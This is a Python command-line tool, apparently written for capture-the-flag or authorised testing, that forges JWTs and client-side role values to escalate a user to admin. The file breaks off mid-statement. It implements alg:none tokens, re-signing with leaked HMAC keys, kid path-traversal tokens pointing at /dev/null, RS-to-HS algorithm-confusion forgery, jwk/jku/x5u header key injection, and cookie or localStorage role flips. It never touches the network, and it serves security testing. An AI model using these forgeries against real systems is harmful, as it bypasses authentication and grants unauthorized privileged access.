#!/usr/bin/env python3
"""Offline auth/JWT trust-failure inspector and artifact builder.

This module never opens a socket and never submits anything.  It only verifies
captured JWTs against *caller-supplied* HMAC keys and builds candidate tokens or
client-side role values for a human to replay against the one assigned target.
There is intentionally no bundled password list and no key generation loop.

CLI examples::

    auth_trust.py inspect TOKEN
    auth_trust.py none TOKEN --set role=admin --set admin=true
    auth_trust.py hmac-confirm TOKEN --key leaked --key delivery-default
    auth_trust.py forge TOKEN --key leaked --set role=admin
    auth_trust.py kid TOKEN --key '' --kid ../../../../dev/null --set role=admin
    auth_trust.py rs-hs TOKEN --public-key server-public.pem --set role=admin
    auth_trust.py key-header TOKEN --kind jku --url https://keys.example/jwks.json --key test
    auth_trust.py role '{"role":"user"}' --storage-key profile --cookie-name profile

All JSON output carries ``offline_only=true`` and ``network_requests=0``.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import re
import sys
import urllib.parse
from itertools import islice
from typing import Any, Iterable


MAX_TOKEN_CHARS = 196_608
MAX_JSON_BYTES = 131_072
MAX_KEYS = 256
MAX_KIDS = 32
MAX_OVERRIDES = 64
MAX_CONTAINER_CHARS = 131_072
MAX_KEY_BYTES = 131_072
MAX_JWKS_KEYS = 32

HMAC_ALGORITHMS = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}
ROLE_KEYS = frozenset({"role", "roles", "group", "groups", "tier", "level", "user_type"})
ADMIN_KEYS = frozenset({
    "admin", "is_admin", "isadmin", "staff", "is_staff", "superuser", "is_superuser",
    "privileged",
})
_B64URL = re.compile(r"^[A-Za-z0-9_-]*$")
_CLAIM_NAME = re.compile(r"^[A-Za-z_][A-Za-z0-9_.:-]{0,127}$")
_COOKIE_NAME = re.compile(r"^[!#$%&'*+.^_`|~0-9A-Za-z-]+$")


class AuthInputError(ValueError):
    """A bounded offline input is malformed or ambiguous."""


def _bounded_iterable(values: Iterable[Any], cap: int, label: str) -> list[Any]:
    """Consume at most ``cap + 1`` items, so a hostile/infinite iterable stays bounded."""
    try:
        iterator = iter(values)
    except TypeError as exc:
        raise AuthInputError(f"{label} must be iterable") from exc
    result = list(islice(iterator, cap + 1))
    if len(result) > cap:
        raise AuthInputError(f"{label} cap exceeded ({len(result)} > {cap})")
    return result


def _no_duplicate_object(pairs):
    result = {}
    for key, value in pairs:
        if key in result:
            raise AuthInputError(f"duplicate JSON key: {key!r}")
        result[key] = value
    return result


def _json_loads_object(raw: bytes | str, *, limit: int = MAX_JSON_BYTES) -> dict[str, Any]:
    if isinstance(raw, bytes):
        if len(raw) > limit:
            raise AuthInputError("JSON exceeds byte limit")
        try:
            text = raw.decode("utf-8", "strict")
        except UnicodeDecodeError as exc:
            raise AuthInputError("JSON is not UTF-8") from exc
    elif isinstance(raw, str):
        text = raw
        if len(text.encode("utf-8")) > limit:
            raise AuthInputError("JSON exceeds byte limit")
    else:
        raise AuthInputError("JSON input must be text or bytes")
    try:
        value = json.loads(text, object_pairs_hook=_no_duplicate_object)
    except AuthInputError:
        raise
    except (json.JSONDecodeError, RecursionError) as exc:
        raise AuthInputError("invalid JSON") from exc
    if not isinstance(value, dict):
        raise AuthInputError("expected a JSON object")
    _reject_deep(value)   # a deeply-nested object parses fine but would blow up on re-serialization
    return value


def _reject_deep(value: Any, *, max_depth: int = 64, _d: int = 0) -> None:
    """Raise AuthInputError if a parsed JSON value nests past max_depth (iterative, no recursion risk)."""
    stack = [(value, 0)]
    while stack:
        node, depth = stack.pop()
        if depth > max_depth:
            raise AuthInputError("JSON nesting too deep")
        if isinstance(node, dict):
            for v in node.values():
                if isinstance(v, (dict, list)):
                    stack.append((v, depth + 1))
        elif isinstance(node, list):
            for v in node:
                if isinstance(v, (dict, list)):
                    stack.append((v, depth + 1))


def _b64url_decode(segment: str, *, limit: int = MAX_JSON_BYTES) -> bytes:
    if not isinstance(segment, str) or not _B64URL.fullmatch(segment):
        raise AuthInputError("invalid base64url segment")
    if len(segment) > ((limit + 2) // 3) * 4 + 4:
        raise AuthInputError("base64url segment exceeds limit")
    try:
        raw = base64.b64decode(segment + "=" * (-len(segment) % 4), altchars=b"-_", validate=True)
    except (ValueError, base64.binascii.Error) as exc:
        raise AuthInputError("invalid base64url segment") from exc
    if len(raw) > limit:
        raise AuthInputError("decoded segment exceeds limit")
    return raw


def _b64url_encode(raw: bytes | str) -> str:
    if isinstance(raw, str):
        raw = raw.encode("utf-8")
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def _json_segment(value: dict[str, Any]) -> str:
    try:
        raw = json.dumps(value, ensure_ascii=False, separators=(",", ":"), sort_keys=True).encode("utf-8")
    except (TypeError, ValueError, RecursionError) as exc:
        raise AuthInputError("claims/header are not JSON serializable") from exc
    if len(raw) > MAX_JSON_BYTES:
        raise AuthInputError("serialized JSON exceeds limit")
    return _b64url_encode(raw)


def _key_bytes(value: bytes | str) -> bytes:
    if isinstance(value, str):
        result = value.encode("utf-8")
    elif isinstance(value, (bytes, bytearray, memoryview)):
        result = bytes(value)
    else:
        raise AuthInputError("HMAC key must be text or bytes")
    if len(result) > MAX_KEY_BYTES:
        raise AuthInputError(f"HMAC key exceeds {MAX_KEY_BYTES} bytes")
    return result


def _bounded_container(value: str, label: str) -> str:
    if len(value.encode("utf-8")) > MAX_CONTAINER_CHARS:
        raise AuthInputError(f"{label} exceeds {MAX_CONTAINER_CHARS} UTF-8 bytes")
    return value


def inspect_jwt(token: str) -> dict[str, Any]:
    """Decode one compact JWT without trusting or verifying it.

    Duplicate JSON keys, invalid base64url, oversized data, and non-object
    header/payload values are rejected rather than interpreted differently from
    a target library.
    """
    if not isinstance(token, str) or not token or len(token) > MAX_TOKEN_CHARS:
        raise AuthInputError("token is empty or exceeds limit")
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise AuthInputError("compact JWT must contain three segments")
    header = _json_loads_object(_b64url_decode(parts[0], limit=16_384), limit=16_384)
    payload = _json_loads_object(_b64url_decode(parts[1]), limit=MAX_JSON_BYTES)
    alg = str(header.get("alg", ""))
    weaknesses = []
    if alg.lower() == "none":
        weaknesses.append("alg_none_declared")
    if alg.upper() in HMAC_ALGORITHMS:
        weaknesses.append("symmetric_hmac_algorithm")
    if not parts[2]:
        weaknesses.append("empty_signature")
    return {
        "header": header,
        "payload": payload,
        "alg": header.get("alg"),
        "kid": header.get("kid"),
        "signature_present": bool(parts[2]),
        "weaknesses": weaknesses,
        "verified": False,
        "offline_only": True,
        "network_requests": 0,
    }


def forge_jwt(payload: dict[str, Any], *, key: bytes | str = b"", alg: str = "HS256",
              header: dict[str, Any] | None = None) -> str:
    """Build an ``alg=none`` or HS256/384/512 compact JWT offline."""
    if not isinstance(payload, dict) or (header is not None and not isinstance(header, dict)):
        raise AuthInputError("payload and header must be mappings")
    algorithm = str(alg)
    hdr = {"alg": algorithm, "typ": "JWT"}
    hdr.update(header or {})
    hdr["alg"] = algorithm
    signing_input = f"{_json_segment(hdr)}.{_json_segment(payload)}"
    if algorithm.lower() == "none":
        return signing_input + "."
    digest = HMAC_ALGORITHMS.get(algorithm.upper())
    if digest is None:
        raise AuthInputError("supported signing algorithms: none, HS256, HS384, HS512")
    key_bytes = _key_bytes(key)
    signature = hmac.new(key_bytes, signing_input.encode("ascii"), digest).digest()
    return f"{signing_input}.{_b64url_encode(signature)}"


def _parts_for_hmac(token: str):
    details = inspect_jwt(token)
    head, payload, signature = token.strip().split(".")
    algorithm = str(details["alg"] or "").upper()
    digest = HMAC_ALGORITHMS.get(algorithm)
    if digest is None or not signature:
        raise AuthInputError("token is not a signed HS256/HS384/HS512 JWT")
    supplied = _b64url_decode(signature, limit=256)
    if len(supplied) != digest().digest_size:
        raise AuthInputError("signature length does not match the declared HMAC algorithm")
    return details, f"{head}.{payload}".encode("ascii"), supplied, digest


def confirm_hmac_keys(token: str, candidates: Iterable[bytes | str], *, max_keys: int = MAX_KEYS):
    """Confirm caller-supplied keys against a captured token's own signature.

    This is a verifier, not a cracker: no keys are invented and the finite
    caller list is rejected when it exceeds ``max_keys``.
    """
    try:
        cap = int(max_keys)
    except (TypeError, ValueError) as exc:
        raise AuthInputError("max_keys must be an integer") from exc
    if not 1 <= cap <= MAX_KEYS:
        raise AuthInputError(f"max_keys must be between 1 and {MAX_KEYS}")
    values = _bounded_iterable(candidates, cap, "candidate-key")
    if not values:
        raise AuthInputError("at least one caller-supplied key is required")
    details, signing_input, supplied, digest = _parts_for_hmac(token)
    matches = []
    for index, value in enumerate(values):
        key = _key_bytes(value)
        if hmac.compare_digest(hmac.new(key, signing_input, digest).digest(), supplied):
            matches.append({"index": index, "key": value if isinstance(value, str)
                            else key.decode("utf-8", "replace")})
    return {
        "algorithm": str(details["alg"]).upper(),
        "tested": len(values),
        "matches": matches,
        "confirmed": bool(matches),
        "candidate_source": "caller_supplied_only",
        "offline_only": True,
        "network_requests": 0,
    }


def apply_claim_overrides(payload: dict[str, Any], overrides: dict[str, Any] | None = None,
                          *, role: str | None = None) -> dict[str, Any]:
    """Return a copied claim object with explicit overrides and optional role elevation."""
    if not isinstance(payload, dict):
        raise AuthInputError("payload must be a mapping")
    changes = dict(overrides or {})
    if len(changes) > MAX_OVERRIDES:
        raise AuthInputError("too many claim overrides")
    if any(not isinstance(key, str) or not _CLAIM_NAME.fullmatch(key) for key in changes):
        raise AuthInputError("invalid claim name")
    result = dict(payload)
    result.update(changes)
    if role is not None:
        role_value = str(role)
        role_hits = [key for key in result if str(key).lower() in ROLE_KEYS]
        admin_hits = [key for key in result if str(key).lower() in ADMIN_KEYS]
        for key in role_hits:
            old = result[key]
            result[key] = ([role_value] + [item for item in old if item != role_value]
                           if isinstance(old, list) else role_value)
        for key in admin_hits:
            result[key] = True
        if not role_hits and not admin_hits:
            result["role"] = role_value
            result["admin"] = True
    return result


def forge_from_token(token: str, *, key: bytes | str = b"", alg: str | None = None,
                     overrides: dict[str, Any] | None = None, role: str | None = None,
                     header_overrides: dict[str, Any] | None = None) -> dict[str, Any]:
    """Re-sign a captured token's edited claims using an explicit key or ``alg=none``."""
    details = inspect_jwt(token)
    algorithm = str(alg if alg is not None else details["alg"])
    header = dict(details["header"])
    header.update(header_overrides or {})
    payload = apply_claim_overrides(details["payload"], overrides, role=role)
    return {
        "rank": 1,
        "kind": "jwt_forgery",
        "algorithm": algorithm,
        "token": forge_jwt(payload, key=key, alg=algorithm, header=header),
        "header": {**header, "alg": algorithm},
        "payload": payload,
        "candidate_only": True,
        "offline_only": True,
        "network_requests": 0,
    }


def forge_alg_none(token: str, *, overrides: dict[str, Any] | None = None,
                   role: str | None = "admin") -> dict[str, Any]:
    """Build the explicit alg:none trust-failure candidate for a captured JWT."""
    result = forge_from_token(token, alg="none", overrides=overrides, role=role,
                              header_overrides={"alg": "none"})
    result.update({
        "kind": "jwt_alg_none",
        "assumption": "the assigned target incorrectly accepts unsigned JWTs",
    })
    return result


def forge_kid_candidates(token: str, *, key: bytes | str, kids: Iterable[str],
                         alg: str | None = None, overrides: dict[str, Any] | None = None,
                         role: str | None = "admin", max_kids: int = MAX_KIDS):
    """Build one signed token per explicitly supplied ``kid`` value.

    The provided key must be the bytes the player expects the selected file/key
    record to contain (for example ``b''`` for ``/dev/null``).  The helper does
    not read paths, query key stores, or send the result.
    """
    try:
        cap = int(max_kids)
    except (TypeError, ValueError) as exc:
        raise AuthInputError("max_kids must be an integer") from exc
    if not 1 <= cap <= MAX_KIDS:
        raise AuthInputError(f"max_kids must be between 1 and {MAX_KIDS}")
    values = _bounded_iterable(kids, cap, "kid candidate")
    if not values:
        raise AuthInputError(f"supply between 1 and {cap} kid values")
    if any(not isinstance(value, str) or not value or len(value) > 2048 or "\x00" in value for value in values):
        raise AuthInputError("kid values must be nonempty bounded text without NUL")
    details = inspect_jwt(token)
    if alg is None:
        captured_algorithm = str(details["alg"] or "").upper()
        algorithm = captured_algorithm if captured_algorithm in HMAC_ALGORITHMS else "HS256"
    else:
        algorithm = str(alg).upper()
        if algorithm not in HMAC_ALGORITHMS:
            raise AuthInputError("kid candidates support only HS256, HS384, or HS512")
    payload = apply_claim_overrides(details["payload"], overrides, role=role)
    base_header = dict(details["header"])
    out = []
    for rank, kid in enumerate(values, 1):
        header = {**base_header, "kid": kid, "alg": algorithm}
        out.append({
            "rank": rank,
            "kind": "jwt_kid_candidate",
            "kid": kid,
            "algorithm": algorithm,
            "token": forge_jwt(payload, key=key, alg=algorithm, header=header),
            "assumption": "the target resolves kid to the verification key represented by the supplied key bytes",
            "candidate_only": True,
            "offline_only": True,
            "network_requests": 0,
        })
    return out


def _der_length(length: int) -> bytes:
    if not 0 <= length <= MAX_KEY_BYTES:
        raise AuthInputError("DER component exceeds limit")
    if length < 128:
        return bytes((length,))
    encoded = length.to_bytes((length.bit_length() + 7) // 8, "big")
    return bytes((0x80 | len(encoded),)) + encoded


def _der(tag: int, body: bytes) -> bytes:
    return bytes((tag,)) + _der_length(len(body)) + body


def _der_integer(value: int) -> bytes:
    if value < 0:
        raise AuthInputError("RSA integer must be non-negative")
    body = value.to_bytes(max(1, (value.bit_length() + 7) // 8), "big")
    if body[0] & 0x80:
        body = b"\x00" + body
    return _der(0x02, body)


def rsa_jwk_to_pem(jwk: dict[str, Any]) -> bytes:
    """Convert one bounded RSA public JWK to canonical SPKI PEM bytes.

    The conversion is pure encoding; no key is generated and no endpoint is
    queried.  Those exact PEM bytes can be the HMAC secret in an RS→HS
    algorithm-confusion candidate when a vulnerable verifier reuses its
    canonical public-key serialization.
    """

    if not isinstance(jwk, dict) or jwk.get("kty") != "RSA":
        raise AuthInputError("JWK must be an RSA public key")
    if not isinstance(jwk.get("n"), str) or not isinstance(jwk.get("e"), str):
        raise AuthInputError("RSA JWK requires base64url n and e")
    modulus_raw = _b64url_decode(jwk["n"], limit=16_384)
    exponent_raw = _b64url_decode(jwk["e"], limit=16)
    if not modulus_raw or not exponent_raw:
        raise AuthInputError("RSA JWK n and e must not be empty")
    modulus = int.from_bytes(modulus_raw, "big")
    exponent = int.from_bytes(exponent_raw, "big")
    if not 512 <= modulus.bit_length() <= 16_384:
        raise AuthInputError("RSA modulus must be between 512 and 16384 bits")
    if not 3 <= exponent <= 0xFFFFFFFF or exponent % 2 == 0:
        raise AuthInputError("RSA public exponent is outside the supported range")
    rsa_public = _der(0x30, _der_integer(modulus) + _der_integer(exponent))
    # rsaEncryption OID 1.2.840.113549.1.1.1 followed by ASN.1 NULL.
    algorithm = _der(0x30, b"\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01\x05\x00")
    spki = _der(0x30, algorithm + _der(0x03, b"\x00" + rsa_public))
    body = base64.b64encode(spki).decode("ascii")
    lines = [body[index:index + 64] for index in range(0, len(body), 64)]
    return ("-----BEGIN PUBLIC KEY-----\n" + "\n".join(lines)
            + "\n-----END PUBLIC KEY-----\n").encode("ascii")


def _rsa_jwk_from_set(value: dict[str, Any], kid: str | None = None) -> dict[str, Any]:
    keys = value.get("keys") if "keys" in value else [value]
    if not isinstance(keys, list) or not 1 <= len(keys) <= MAX_JWKS_KEYS:
        raise AuthInputError(f"JWKS must contain between 1 and {MAX_JWKS_KEYS} keys")
    candidates = [item for item in keys if isinstance(item, dict) and item.get("kty") == "RSA"]
    if kid is not None:
        candidates = [item for item in candidates if item.get("kid") == kid]
    if len(candidates) != 1:
        qualifier = f" matching kid {kid!r}" if kid is not None else ""
        raise AuthInputError(f"JWKS must identify exactly one RSA key{qualifier}")
    return candidates[0]


def public_key_hmac_secret(public_key: bytes | str | dict[str, Any], *,
                           kid: str | None = None) -> tuple[bytes, str]:
    """Return exact/canonical public-key bytes and a provenance label."""

    if isinstance(public_key, dict):
        return rsa_jwk_to_pem(_rsa_jwk_from_set(public_key, kid)), "jwks_canonical_spki_pem"
    if isinstance(public_key, str):
        raw = public_key.encode("utf-8")
    elif isinstance(public_key, (bytes, bytearray, memoryview)):
        raw = bytes(public_key)
    else:
        raise AuthInputError("public key must be PEM text/bytes or a JWKS object")
    if not raw or len(raw) > MAX_KEY_BYTES or b"\x00" in raw:
        raise AuthInputError("public-key material is empty or exceeds the limit")
    stripped = raw.strip()
    if stripped.startswith(b"{"):
        jwks = _json_loads_object(stripped, limit=MAX_KEY_BYTES)
        return rsa_jwk_to_pem(_rsa_jwk_from_set(jwks, kid)), "jwks_canonical_spki_pem"
    match = re.fullmatch(
        br"-----BEGIN (PUBLIC KEY|RSA PUBLIC KEY)-----\s+([A-Za-z0-9+/=\s]+)"
        br"-----END \1-----",
        stripped,
    )
    if not match:
        raise AuthInputError("public key must be bounded PUBLIC KEY/RSA PUBLIC KEY PEM or JWKS JSON")
    try:
        der = base64.b64decode(re.sub(br"\s+", b"", match.group(2)), validate=True)
    except (ValueError, base64.binascii.Error) as exc:
        raise AuthInputError("public-key PEM body is invalid base64") from exc
    if not der or len(der) > MAX_KEY_BYTES:
        raise AuthInputError("public-key PEM body is empty or exceeds the limit")
    # Preserve byte-for-byte PEM input: vulnerable libraries often use the
    # configured serialization, including its newline spelling, as the HMAC key.
    return raw, "caller_supplied_pem_exact_bytes"


def forge_rs_hs_confusion(token: str, public_key: bytes | str | dict[str, Any], *,
                          kid: str | None = None, alg: str = "HS256",
                          overrides: dict[str, Any] | None = None,
                          role: str | None = "admin") -> dict[str, Any]:
    """Forge an offline RS→HS confusion candidate using supplied public-key bytes."""

    algorithm = str(alg).upper()
    if algorithm not in HMAC_ALGORITHMS:
        raise AuthInputError("RS-to-HS candidates require HS256, HS384, or HS512")
    details = inspect_jwt(token)
    captured_alg = str(details.get("alg") or "").upper()
    if not captured_alg.startswith(("RS", "PS")):
        raise AuthInputError("captured token must declare an RSA/PS signing algorithm")
    secret, source = public_key_hmac_secret(public_key, kid=kid)
    header = dict(details["header"])
    if kid is not None:
        header["kid"] = kid
    payload = apply_claim_overrides(details["payload"], overrides, role=role)
    forged = forge_jwt(payload, key=secret, alg=algorithm, header=header)
    return {
        "rank": 1,
        "kind": "jwt_rs_to_hs_confusion",
        "captured_algorithm": captured_alg,
        "algorithm": algorithm,
        "token": forged,
        "header": {**header, "alg": algorithm},
        "payload": payload,
        "public_key_source": source,
        "hmac_secret_length": len(secret),
        "hmac_secret_sha256": hashlib.sha256(secret).hexdigest(),
        "assumption": "the target accepts an HMAC algorithm and reuses these RSA public-key bytes as its HMAC secret",
        "candidate_only": True,
        "offline_only": True,
        "network_requests": 0,
    }


def _header_key_url(value: str, label: str) -> str:
    if not isinstance(value, str) or not value or len(value) > 4096:
        raise AuthInputError(f"{label} URL is empty or exceeds the limit")
    if any(ord(ch) < 32 or ord(ch) == 127 for ch in value):
        raise AuthInputError(f"{label} URL contains a control character")
    try:
        parsed = urllib.parse.urlsplit(value)
        _ = parsed.port
    except ValueError as exc:
        raise AuthInputError(f"invalid {label} URL") from exc
    if (parsed.scheme.lower() not in {"http", "https"} or not parsed.hostname
            or parsed.username is not None or parsed.password is not None):
        raise AuthInputError(f"{label} must be an absolute http(s) URL without credentials")
    return value


def forge_header_key_injection(token: str, *, kind: str, key: bytes | str,
                               url: str | None = None,
                               jwk: dict[str, Any] | None = None,
                               kid: str | None = None, alg: str = "HS256",
                               overrides: dict[str, Any] | None = None,
                               role: str | None = "admin") -> dict[str, Any]:
    """Build a signed ``jwk``/``jku``/``x5u`` header-trust candidate.

    HMAC is used so the function remains a deterministic artifact builder.  A
    caller may provide an explicit JWK; otherwise ``kind='jwk'`` embeds an
    ``oct`` JWK for the supplied test key.  URL modes merely place the supplied
    URL in the header—they never fetch or host it.
    """

    mode = str(kind).lower()
    if mode not in {"jwk", "jku", "x5u"}:
        raise AuthInputError("kind must be jwk, jku, or x5u")
    algorithm = str(alg).upper()
    if algorithm not in HMAC_ALGORITHMS:
        raise AuthInputError("header-key candidates require HS256, HS384, or HS512")
    key_bytes = _key_bytes(key)
    details = inspect_jwt(token)
    header = dict(details["header"])
    header["alg"] = algorithm
    if kid is not None:
        if not isinstance(kid, str) or not kid or len(kid) > 2048 or "\x00" in kid:
            raise AuthInputError("kid must be non-empty bounded text without NUL")
        header["kid"] = kid
    if mode == "jwk":
        if jwk is not None and not isinstance(jwk, dict):
            raise AuthInputError("embedded jwk must be a JSON object")
        embedded = dict(jwk) if jwk is not None else {
            "kty": "oct", "k": _b64url_encode(key_bytes), "alg": algorithm, "use": "sig",
        }
        _reject_deep(embedded)
        # Round-trip through the bounded serializer/parser to reject odd keys,
        # non-JSON values, duplicates cannot arise in a mapping object here.
        try:
            encoded_jwk = json.dumps(
                embedded, separators=(",", ":"), ensure_ascii=False
            ).encode("utf-8")
        except (TypeError, ValueError, RecursionError) as exc:
            raise AuthInputError("embedded jwk must contain bounded JSON values") from exc
        embedded = _json_loads_object(encoded_jwk)
        header["jwk"] = embedded
    else:
        if jwk is not None:
            raise AuthInputError("an embedded jwk applies only to kind='jwk'")
        if url is None:
            raise AuthInputError(f"kind={mode} requires an explicit URL")
        header[mode] = _header_key_url(url, mode)
    payload = apply_claim_overrides(details["payload"], overrides, role=role)
    return {
        "rank": 1,
        "kind": f"jwt_{mode}_header_injection",
        "algorithm": algorithm,
        "token": forge_jwt(payload, key=key_bytes, alg=algorithm, header=header),
        "header": header,
        "payload": payload,
        "assumption": f"the target trusts the attacker-controlled {mode} header when selecting a verification key",
        "candidate_only": True,
        "offline_only": True,
        "network_requests": 0,
    }


def _decode_client_container(value: str, encoding: str) -> Any:
    if not isinstance(value, str) or len(value) > MAX_CONTAINER_CHARS:
        raise AuthInputError("client-side value is empty or exceeds limit")
    kind = encoding.lower().replace("_", "-")
    if kind == "plain":
        return value
    if kind == "json":
        return _json_loads_object(value)
    if kind == "url-json":
        try:
            decoded = urllib.parse.unquote(value, errors="strict")
        except UnicodeDecodeError as exc:
            raise AuthInputError("URL-encoded JSON is not UTF-8") from exc
        return _json_loads_object(decoded)
    if kind == "base64url-json":
        return _json_loads_object(_b64url_decode(value))
    raise AuthInputError("encoding must be plain, json, url-json, or base64url-json")


def forge_client_role(value: str, *, encoding: str = "json", role: str = "admin",
                      overrides: dict[str, Any] | None = None, storage_key: str | None = None,
                      cookie_name: str | None = None):
    """Forge ranked localStorage/cookie values from an unsigned client-side object.

    The return values are data/request descriptors, not browser automation.
    Supplying ``storage_key`` and/or ``cookie_name`` controls which descriptors
    are emitted.  If neither is provided, both generic forms are shown.
    """
    encoding = encoding.lower().replace("_", "-")
    original = _decode_client_container(value, encoding)
    if encoding == "plain":
        if overrides:
            raise AuthInputError("--set/object overrides do not apply to a plain scalar role")
        payload: Any = str(role)
        encoded = _bounded_container(str(role), "plain role")
        if not encoded or "\x00" in encoded:
            raise AuthInputError("plain role is empty or exceeds the size limit")
    else:
        payload = apply_claim_overrides(original, overrides, role=role)
        compact = _bounded_container(
            json.dumps(payload, ensure_ascii=False, separators=(",", ":"), sort_keys=True),
            "serialized role object",
        )
        encoded = {
            "json": compact,
            "url-json": urllib.parse.quote(compact, safe=""),
            "base64url-json": _b64url_encode(compact),
        }[encoding]
        encoded = _bounded_container(encoded, "encoded role object")
    keys = []
    if storage_key is not None:
        keys.append(("local_storage_role_flip", storage_key))
    if cookie_name is not None:
        keys.append(("cookie_role_flip", cookie_name))
    if not keys:
        keys = [("local_storage_role_flip", None), ("cookie_role_flip", None)]
    out = []
    for rank, (kind, supplied_name) in enumerate(keys, 1):
        generic = supplied_name is None
        name = ("<storage-key>" if kind == "local_storage_role_flip" else "<cookie-name>") \
            if generic else str(supplied_name)
        if not generic:
            if (not name or len(name) > 256
                    or any(ord(char) < 0x20 or ord(char) == 0x7F for char in name)):
                raise AuthInputError("storage/cookie name is invalid")
            if kind == "cookie_role_flip" and not _COOKIE_NAME.fullmatch(name):
                raise AuthInputError("cookie name must be an RFC token")
        row = {
            "rank": rank,
            "kind": kind,
            "name": name,
            "value": encoded,
            "encoding": encoding,
            "payload": payload,
            "candidate_only": True,
            "offline_only": True,
            "network_requests": 0,
        }
        if kind == "cookie_role_flip":
            cookie_value = encoded
            if any(ord(char) < 0x21 or ord(char) > 0x7E or char in '";,\\' for char in cookie_value):
                cookie_value = urllib.parse.quote(cookie_value, safe="!#$%&'()*+-./:<=>?@[]^_`{|}~")
                row["value"] = cookie_value
                row["cookie_transport_encoding"] = "percent"
            if generic:
                row["request_header_template"] = f"Cookie: {name}={cookie_value}"
            else:
                row["request_header"] = {"Cookie": f"{name}={cookie_value}"}
        else:
            operation = {"operation": "localStorage.setItem", "key": name, "value": encoded}
            row["browser_operation_template" if generic else "browser_operation"] = operation
        out.append(row)
    return out


def _parse_set(values: list[str] | None) -> dict[str, Any]:
    result = {}
    for item in values or []:
        if "=" not in item:
            raise AuthInputError("--set values must have NAME=JSON_OR_TEXT form")
        name, raw = item.split("=", 1)
        if not _CLAIM_NAME.fullmatch(name):
            raise AuthInputError(f"invalid claim name: {name!r}")
        if name in result:
            raise AuthInputError(f"duplicate --set claim: {name!r}")
        try:
            value = json.loads(raw, object_pairs_hook=_no_duplicate_object)
        except (json.JSONDecodeError, AuthInputError):
            value = raw
        result[name] = value
    if len(result) > MAX_OVERRIDES:
        raise AuthInputError("too many --set values")
    return result


def _keys_file(path: str) -> list[str]:
    try:
        data = open(path, "rb").read(MAX_JSON_BYTES + 1)
    except OSError as exc:
        raise AuthInputError(f"cannot read key file: {exc}") from exc
    if len(data) > MAX_JSON_BYTES:
        raise AuthInputError("key file exceeds limit")
    try:
        text = data.decode("utf-8", "strict")
    except UnicodeDecodeError as exc:
        raise AuthInputError("key file must be UTF-8") from exc
    lines = [line.rstrip("\r\n") for line in text.splitlines()]
    if len(lines) > MAX_KEYS:
        raise AuthInputError(f"key file exceeds {MAX_KEYS} lines")
    return lines


def _material_file(path: str, label: str) -> bytes:
    try:
        with open(path, "rb") as handle:
            data = handle.read(MAX_KEY_BYTES + 1)
    except OSError as exc:
        raise AuthInputError(f"cannot read {label} file: {exc}") from exc
    if not data or len(data) > MAX_KEY_BYTES:
        raise AuthInputError(f"{label} file is empty or exceeds {MAX_KEY_BYTES} bytes")
    return data


def _parser():
    parser = argparse.ArgumentParser(description="offline JWT/auth trust artifact builder; sends nothing")
    sub = parser.add_subparsers(dest="command", required=True)
    inspect = sub.add_parser("inspect", help="decode one JWT without verification")
    inspect.add_argument("token")

    none = sub.add_parser("none", help="build an alg:none role token")
    none.add_argument("token")
    none.add_argument("--set", action="append", default=[])
    none.add_argument("--role", default="admin")

    confirm = sub.add_parser("hmac-confirm", help="verify only explicitly supplied candidate keys")
    confirm.add_argument("token")
    confirm.add_argument("--key", action="append", default=[])
    confirm.add_argument("--keys-file")

    forge = sub.add_parser("forge", help="edit and HMAC-sign captured JWT claims")
    forge.add_argument("token")
    forge.add_argument("--key", required=True)
    forge.add_argument("--alg", choices=sorted(HMAC_ALGORITHMS))
    forge.add_argument("--set", action="append", default=[])
    forge.add_argument("--role")

    kid = sub.add_parser("kid", help="build signed tokens for explicit kid header candidates")
    kid.add_argument("token")
    kid.add_argument("--key", required=True)
    kid.add_argument("--kid", action="append", required=True)
    kid.add_argument("--alg", choices=sorted(HMAC_ALGORITHMS))
    kid.add_argument("--set", action="append", default=[])
    kid.add_argument("--role", default="admin")

    confusion = sub.add_parser("rs-hs", help="build an RSA-public-key to HMAC confusion token")
    confusion.add_argument("token")
    confusion.add_argument("--public-key", required=True,
                           help="bounded PEM or JWKS file; never fetched")
    confusion.add_argument("--kid")
    confusion.add_argument("--alg", choices=sorted(HMAC_ALGORITHMS), default="HS256")
    confusion.add_argument("--set", action="append", default=[])
    confusion.add_argument("--role", default="admin")

    key_header = sub.add_parser("key-header", help="build a jwk/jku/x5u header-key candidate")
    key_header.add_argument("token")
    key_header.add_argument("--kind", choices=("jwk", "jku", "x5u"), required=True)
    key_header.add_argument("--key", required=True, help="explicit test HMAC key")
    key_header.add_argument("--url", help="explicit jku/x5u URL; never fetched")
    key_header.add_argument("--jwk-json", help="explicit embedded JWK object")
    key_header.add_argument("--kid")
    key_header.add_argument("--alg", choices=sorted(HMAC_ALGORITHMS), default="HS256")
    key_header.add_argument("--set", action="append", default=[])
    key_header.add_argument("--role", default="admin")

    role = sub.add_parser("role", help="forge unsigned localStorage/cookie role objects")
    role.add_argument("value")
    role.add_argument("--encoding", choices=("plain", "json", "url-json", "base64url-json"), default="json")
    role.add_argument("--role", default="admin")
    role.add_argument("--set", action="append", default=[])
    role.add_argument("--storage-key")
    role.add_argument("--cookie-name")
    return parser


def main(argv=None) -> int:
    try:
        args = _parser().parse_args(argv)
    except SystemExit as exc:
        return exc.code if isinstance(exc.code, int) else 2
    try:
        overrides = _parse_set(getattr(args, "set", []))
        if args.command == "inspect":
            result = inspect_jwt(args.token)
        elif args.command == "none":
            result = forge_alg_none(args.token, overrides=overrides, role=args.role)
        elif args.command == "hmac-confirm":
            keys = list(args.key)
            if args.keys_file:
                keys.extend(_keys_file(args.keys_file))
            result = confirm_hmac_keys(args.token, keys)
        elif args.command == "forge":
            result = forge_from_token(args.token, key=args.key, alg=args.alg,
                                      overrides=overrides, role=args.role)
        elif args.command == "kid":
            result = forge_kid_candidates(args.token, key=args.key, kids=args.kid, alg=args.alg,
                                           overrides=overrides, role=args.role)
        elif args.command == "rs-hs":
            result = forge_rs_hs_confusion(
                args.token, _material_file(args.public_key, "public key"), kid=args.kid,
                alg=args.alg, overrides=overrides, role=args.role,
            )
        elif args.command == "key-header":
            embedded = _json_loads_object(args.jwk_json) if args.jwk_json is not None else None
            result = forge_header_key_injection(
                args.token, kind=args.kind, key=args.key, url=args.url, jwk=embedded,
                kid=args.kid, alg=args.alg, overrides=overrides, role=args.role,
            )
        else:
            result = forge_client_role(args.value, encoding=args.encoding, role=args.role,
